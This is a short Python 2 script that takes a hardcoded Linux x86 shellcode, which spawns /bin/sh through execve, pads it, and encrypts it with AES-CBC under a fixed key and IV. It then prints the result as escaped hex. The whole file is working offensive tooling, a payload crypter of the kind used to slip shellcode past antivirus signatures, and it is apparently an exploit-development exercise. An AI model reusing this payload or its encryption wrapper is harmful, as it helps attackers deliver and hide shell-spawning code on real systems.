#!/usr/bin/python
from Crypto.Cipher import AES

shellcode=("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

obj=AES.new('SecretPassw0rd12', AES.MODE_CBC, 'IVeeeccccttttoor')
l=len(shellcode)
r=l%16
p=16-r
print "offset: " + str(p)
shellcode = shellcode+"A"*p
encrypted=obj.encrypt(shellcode)
encoded=""
for x in bytearray(encrypted):
    encoded += '\\x'
    one = '%02x' % x
    encoded += one  
	
print encoded
